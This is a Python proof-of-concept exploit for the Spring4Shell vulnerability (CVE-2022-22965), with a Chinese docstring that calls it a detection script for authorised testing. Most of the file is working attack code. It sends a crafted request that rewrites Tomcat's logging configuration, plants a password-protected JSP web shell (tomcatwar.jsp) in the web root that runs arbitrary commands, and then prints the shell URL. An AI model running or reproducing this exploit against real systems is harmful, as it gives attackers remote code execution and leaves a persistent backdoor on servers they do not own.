#! /usr/bin/env python3
#coding:utf-8

"""
Spring4Shell CVE-2022-22965 POC 检测脚本

漏洞描述:
Spring Framework 存在远程代码执行漏洞(CVE-2022-22965,又称Spring4Shell)。
攻击者可以通过构造恶意的 HTTP 请求来修改 Tomcat 日志配置,
从而实现远程代码执行。

影响版本:
- Spring Framework 5.3.0 - 5.3.17
- Spring Framework 5.2.0 - 5.2.19
- 以及其他早期版本

检测原理:
通过发送包含恶意参数的 POST 请求来修改 Tomcat 的日志配置,
然后尝试访问上传的 JSP 文件。如果能够成功访问,则说明存在漏洞。

使用方法:
    python CVE-2022-22965.py --url http://127.0.0.1:8080

参数说明:
    url: 目标URL
    file: 包含多个URL的文件(可选)

返回值:
    存在漏洞时打印shell URL,否则打印失败信息

注意:
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
"""



import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from urllib.parse import urljoin,urlparse
from threading import Thread
from sys import exit
import time
    

class Exploit(Thread):



    def __init__(self, url):
        super(self.__class__, self).__init__()

        self.url = url

    def run(self):

        """
        执行漏洞利用
        
        通过发送恶意请求修改Tomcat日志配置,上传WebShell
        """


        headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

        try:
            requests.post(self.url,
                          headers=headers,
                          data=data,
                          timeout=15,
                          allow_redirects=False,
                          verify=False)


            shellurl = urljoin(self.url, 'tomcatwar.jsp')
            shellgo = requests.get(shellurl,
                                   timeout=15,
                                   allow_redirects=False,
                                   stream=True,
                                   verify=False)
            if shellgo.status_code == 200:
                print(f"Vulnerable,shell url: {shellurl}?pwd=j&cmd=whoami")



            else:
                parsedurl = urlparse(shellurl)
                rooturl = parsedurl.scheme+"://"+parsedurl.netloc # There is 100% a better way to do this, please make a PR if you know!
                shellurlroot = urljoin(rooturl, 'tomcatwar.jsp')
                shellgoroot = requests.get(shellurlroot,
                                   timeout=15,
                                   allow_redirects=False,
                                   stream=True,
                                   verify=False)
                if shellgoroot.status_code == 200: 
                    print(f"Vulnerable,shell url: {shellurlroot}?pwd=j&cmd=whoami")
                else:
                    print("\033[91m[" + '\u2718' + "]\033[0m", self.url,
                        "\033[91mNot Vulnerable! :(\033[0m ")

        except Exception as e:
            print(e)
            pass


